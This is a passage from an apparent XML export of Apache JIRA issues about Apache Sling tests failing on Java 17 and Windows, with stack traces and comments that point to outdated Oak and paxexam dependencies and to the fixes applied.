	at org.apache.sling.testing.mock.sling.oak.OakMockSlingRepository.loginAdministrative(OakMockSlingRepository.java:139)
	at org.apache.sling.testing.mock.sling.ResourceResolverFactoryInitializer.registerJcrNodeTypes(ResourceResolverFactoryInitializer.java:240)
	at org.apache.sling.testing.mock.sling.ResourceResolverFactoryInitializer.setUp(ResourceResolverFactoryInitializer.java:70)
	at org.apache.sling.testing.mock.sling.MockSling.newResourceResolverFactory(MockSling.java:76)
	at org.apache.sling.testing.mock.sling.context.ContextResourceResolverFactory.get(ContextResourceResolverFactory.java:47)
	... 26 more
Caused by: java.lang.ClassNotFoundException: java.security.acl.Group
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:641)
	at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:188)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)
	... 47 more&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13538401">SLING-11897</key>
            <summary>Default Get Servlet tests fail on Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 1 Jun 2023 11:52:55 +0000</created>
                <updated>Sun, 8 Oct 2023 08:26:17 +0000</updated>
                            <resolved>Fri, 2 Jun 2023 11:38:29 +0000</resolved>
                                                    <fixVersion>Servlets Get 2.2.0</fixVersion>
                                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17728358" author="sseifert@pro-vision.de" created="Thu, 1 Jun 2023 13:09:40 +0000"  >&lt;p&gt;probably same root cause as in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11894&quot; title=&quot;jcr-contentloader: Fix paxexam Integration Tests with Java 17&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11894&quot;&gt;&lt;del&gt;SLING-11894&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17728418" author="enorman" created="Thu, 1 Jun 2023 16:30:34 +0000"  >&lt;p&gt;I don&apos;t have a java17 enviornment handy to test this, but bumping the org.apache.sling.testing.sling-mock-oak dependency to one of the 3.1.x versions may be worth a try as the oak version would then be &amp;gt; 1.26.0&lt;/p&gt;</comment>
                            <comment id="17728649" author="rombert" created="Fri, 2 Jun 2023 09:44:31 +0000"  >&lt;p&gt;I&apos;ve attempted a fix at &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-get/pull/12&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-get/pull/12&lt;/a&gt; . I also created a wiki page to centralise Java version upgrade problem patterns, so that we document how to fix them rather than find out each time  - &lt;a href=&quot;https://cwiki.apache.org/confluence/display/SLING/Common+CI+failures+when+upgrading+to+a+new+Java+version&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://cwiki.apache.org/confluence/display/SLING/Common+CI+failures+when+upgrading+to+a+new+Java+version&lt;/a&gt; .&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13538288">SLING-11894</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 20 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1i9ow:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11894] jcr-contentloader: Fix paxexam Integration Tests with Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11894</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;currently, the integration tests for JCR contentloader are failing on both linux and windows when running with Java 17.&lt;/p&gt;

&lt;p&gt;all ITs are failing with an error like this:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] Running org.apache.sling.jcr.contentloader.it.OrderedInitialContentIT
[ERROR] Tests run: 2, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 64.826 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.jcr.contentloader.it.OrderedInitialContentIT
[ERROR] org.apache.sling.jcr.contentloader.it.OrderedInitialContentIT.initialContentInstalled  Time elapsed: 11.066 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
org.ops4j.pax.swissbox.tracker.ServiceLookupException: gave up waiting for service org.apache.sling.resource.presence.ResourcePresence
        at org.ops4j.pax.swissbox.tracker.ServiceLookup.getService(ServiceLookup.java:199)
        at org.ops4j.pax.swissbox.tracker.ServiceLookup.getService(ServiceLookup.java:136)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectField(ServiceInjector.java:89)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectDeclaredFields(ServiceInjector.java:69)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectFields(ServiceInjector.java:61)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.createTest(ContainerTestRunner.java:68)
        at org.junit.runners.BlockJUnit4ClassRunner$1.runReflectiveCall(BlockJUnit4ClassRunner.java:266)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.BlockJUnit4ClassRunner.methodBlock(BlockJUnit4ClassRunner.java:263)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChildWithRetry(ContainerTestRunner.java:84)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChild(ContainerTestRunner.java:75)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChild(ContainerTestRunner.java:43)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.junit.runner.JUnitCore.run(JUnitCore.java:137)
        at org.junit.runner.JUnitCore.run(JUnitCore.java:115)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.invokeViaJUnit(JUnitProbeInvoker.java:124)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.findAndInvoke(JUnitProbeInvoker.java:97)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.call(JUnitProbeInvoker.java:73)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:568)
        at org.ops4j.pax.swissbox.framework.RemoteFrameworkImpl.invokeMethodOnService(RemoteFrameworkImpl.java:435)
        at org.ops4j.pax.swissbox.framework.RemoteFrameworkImpl.invokeMethodOnService(RemoteFrameworkImpl.java:408)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:568)
        at java.rmi/sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:360)
        at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:200)
        at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)
        at java.rmi/sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:587)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:705)
        at java.base/java.security.AccessController.doPrivileged(AccessController.java:399)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:704)
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
        at java.base/java.lang.Thread.run(Thread.java:833)

[ERROR] org.apache.sling.jcr.contentloader.it.OrderedInitialContentIT.bundleStarted  Time elapsed: 10.007 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
org.ops4j.pax.swissbox.tracker.ServiceLookupException: gave up waiting for service org.apache.sling.jcr.api.SlingRepository
        at org.ops4j.pax.swissbox.tracker.ServiceLookup.getService(ServiceLookup.java:199)
        at org.ops4j.pax.swissbox.tracker.ServiceLookup.getService(ServiceLookup.java:136)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectField(ServiceInjector.java:89)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectDeclaredFields(ServiceInjector.java:69)
        at org.ops4j.pax.exam.inject.internal.ServiceInjector.injectFields(ServiceInjector.java:61)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.createTest(ContainerTestRunner.java:68)
        at org.junit.runners.BlockJUnit4ClassRunner$1.runReflectiveCall(BlockJUnit4ClassRunner.java:266)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
        at org.junit.runners.BlockJUnit4ClassRunner.methodBlock(BlockJUnit4ClassRunner.java:263)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChildWithRetry(ContainerTestRunner.java:84)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChild(ContainerTestRunner.java:75)
        at org.ops4j.pax.exam.invoker.junit.internal.ContainerTestRunner.runChild(ContainerTestRunner.java:43)
        at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
        at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
        at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
        at org.junit.runner.JUnitCore.run(JUnitCore.java:137)
        at org.junit.runner.JUnitCore.run(JUnitCore.java:115)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.invokeViaJUnit(JUnitProbeInvoker.java:124)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.findAndInvoke(JUnitProbeInvoker.java:97)
        at org.ops4j.pax.exam.invoker.junit.internal.JUnitProbeInvoker.call(JUnitProbeInvoker.java:73)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:568)
        at org.ops4j.pax.swissbox.framework.RemoteFrameworkImpl.invokeMethodOnService(RemoteFrameworkImpl.java:435)
        at org.ops4j.pax.swissbox.framework.RemoteFrameworkImpl.invokeMethodOnService(RemoteFrameworkImpl.java:408)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
        at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.base/java.lang.reflect.Method.invoke(Method.java:568)
        at java.rmi/sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:360)
        at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:200)
        at java.rmi/sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)
        at java.rmi/sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:587)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:705)
        at java.base/java.security.AccessController.doPrivileged(AccessController.java:399)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:704)
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
        at java.base/java.lang.Thread.run(Thread.java:833)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13538288">SLING-11894</key>
            <summary>jcr-contentloader: Fix paxexam Integration Tests with Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="daim">Rishabh Daim</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Wed, 31 May 2023 16:02:00 +0000</created>
                <updated>Thu, 17 Aug 2023 07:59:23 +0000</updated>
                            <resolved>Thu, 17 Aug 2023 07:59:23 +0000</resolved>
                                                    <fixVersion>JCR ContentLoader 2.6.2</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17728049" author="sseifert@pro-vision.de" created="Wed, 31 May 2023 16:11:52 +0000"  >&lt;p&gt;i&apos;ve no experience with paxexam and unsure how to best deeper analyze the root cause here&lt;/p&gt;</comment>
                            <comment id="17728086" author="enorman" created="Wed, 31 May 2023 17:44:30 +0000"  >&lt;p&gt;It looks to me like the tests need to depend on a newer version of oak ( &amp;gt; 1.26.0) for &lt;a href=&quot;https://issues.apache.org/jira/browse/OAK-7358&quot; title=&quot;Remove all usage of java.security.acl.Group for Java 14&quot; class=&quot;issue-link&quot; data-issue-key=&quot;OAK-7358&quot;&gt;&lt;del&gt;OAK-7358&lt;/del&gt;&lt;/a&gt;?&#160; It looks like SlingVersionResolver from the latest org.apache.sling.testing.paxexam:3.1.0 release is currently hardoded to oak version 1.12.0.&#160; However, the latest SNAPSHOT of the same has bumped oak to 1.48.0, so maybe bumping the org.apache.sling.testing.paxexam dependency to 4.0.0-SNAPSHOT could be worth a try?&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;A quick look at the jdk_17_latest/target/failsafe-reports/org.apache.sling.jcr.contentloader.it.BasicInitialContentIT-output.txt log file shows the following as the reason why the SlingRepository service has not started:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;org.apache.sling.jcr.base[org.apache.sling.jcr.oak.server.internal.OakSlingRepositoryManager] : Exception in a SlingRepositoryInitializer, SlingRepository service registration aborted
java.lang.NoClassDefFoundError: java/security/acl/Group
	at java.base/java.lang.ClassLoader.defineClass1(Native Method)
	at java.base/java.lang.ClassLoader.defineClass(ClassLoader.java:1012)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.defineClass(BundleWiringImpl.java:2344)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.defineClassParallel(BundleWiringImpl.java:2162)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.findClass(BundleWiringImpl.java:2096)
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1565)
	at org.apache.felix.framework.BundleWiringImpl.access$300(BundleWiringImpl.java:79)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1982)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)
	at org.apache.felix.framework.BundleWiringImpl.getClassByDelegation(BundleWiringImpl.java:1375)
	at org.apache.felix.framework.BundleWiringImpl.searchImports(BundleWiringImpl.java:1618)
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1548)
	at org.apache.felix.framework.BundleWiringImpl.access$300(BundleWiringImpl.java:79)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1982)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)
	at org.apache.jackrabbit.oak.security.user.UserPrincipalProvider.getPrincipal(UserPrincipalProvider.java:112)
	at org.apache.jackrabbit.oak.spi.security.principal.PrincipalManagerImpl.getPrincipal(PrincipalManagerImpl.java:45)
	at org.apache.jackrabbit.oak.jcr.delegate.PrincipalManagerDelegator$2.performNullable(PrincipalManagerDelegator.java:65)
	at org.apache.jackrabbit.oak.jcr.delegate.PrincipalManagerDelegator$2.performNullable(PrincipalManagerDelegator.java:62)
	at org.apache.jackrabbit.oak.jcr.delegate.SessionDelegate.performNullable(SessionDelegate.java:242)
	at org.apache.jackrabbit.oak.jcr.delegate.PrincipalManagerDelegator.getPrincipal(PrincipalManagerDelegator.java:62)
	at org.apache.jackrabbit.commons.jackrabbit.authorization.AccessControlUtils.getPrincipal(AccessControlUtils.java:370)
	at org.apache.sling.jcr.repoinit.impl.AclUtil.setAcl(AclUtil.java:131)
	at org.apache.sling.jcr.repoinit.impl.AclUtil.setAcl(AclUtil.java:111)
	at org.apache.sling.jcr.repoinit.impl.AclVisitor.setAcl(AclVisitor.java:61)
	at org.apache.sling.jcr.repoinit.impl.AclVisitor.visitSetAclPrincipal(AclVisitor.java:84)
	at org.apache.sling.repoinit.parser.operations.SetAclPrincipals.accept(SetAclPrincipals.java:53)
	at org.apache.sling.jcr.repoinit.impl.JcrRepoInitOpsProcessorImpl.apply(JcrRepoInitOpsProcessorImpl.java:54)
	at org.apache.sling.jcr.repoinit.impl.RepositoryInitializerFactory.processRepository(RepositoryInitializerFactory.java:120)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.executeRepositoryInitializers(AbstractSlingRepositoryManager.java:556)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.initializeAndRegisterRepositoryService(AbstractSlingRepositoryManager.java:500)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager.access$300(AbstractSlingRepositoryManager.java:86)
	at org.apache.sling.jcr.base.AbstractSlingRepositoryManager$4.run(AbstractSlingRepositoryManager.java:462)
Caused by: java.lang.ClassNotFoundException: java.security.acl.Group
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:641)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)
	at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1475)
	at org.apache.felix.framework.BundleWiringImpl.access$300(BundleWiringImpl.java:79)
	at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1982)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)
	... 33 more
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                            <comment id="17752682" author="JIRAUSER299730" created="Thu, 10 Aug 2023 08:04:16 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=enorman&quot; class=&quot;user-hover&quot; rel=&quot;enorman&quot;&gt;enorman&lt;/a&gt; &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; I have updated the org.apache.sling.testing.paxexam dependency to 4.0.0 and now IT tests have passed.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13538281">SLING-11893</issuekey>
        </issuelink>
                            </outwardlinks>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13538401">SLING-11897</issuekey>
        </issuelink>
            <issuelink>
            <issuekey id="13542141">SLING-11923</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 11 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1i900:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11893] jcr-contentloader: Fix unit tests on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11893</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;the unit tests are currently failing when executing on windows.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13538281">SLING-11893</key>
            <summary>jcr-contentloader: Fix unit tests on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Wed, 31 May 2023 14:17:15 +0000</created>
                <updated>Wed, 31 May 2023 16:10:33 +0000</updated>
                            <resolved>Wed, 31 May 2023 16:10:33 +0000</resolved>
                                                    <fixVersion>JCR ContentLoader 2.6.2</fixVersion>
                                    <component>JCR</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17728048" author="sseifert@pro-vision.de" created="Wed, 31 May 2023 16:10:33 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-contentloader/commit/986009548c742d1bc991406d61e62740c055f19c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-jcr-contentloader/commit/986009548c742d1bc991406d61e62740c055f19c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;there is another issue with failing integration tests on Java 17 - but this it not specific to windows (fails also with linux) - created a follow-up ticket for this: &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11894&quot; title=&quot;jcr-contentloader: Fix paxexam Integration Tests with Java 17&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11894&quot;&gt;&lt;del&gt;SLING-11894&lt;/del&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13538288">SLING-11894</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
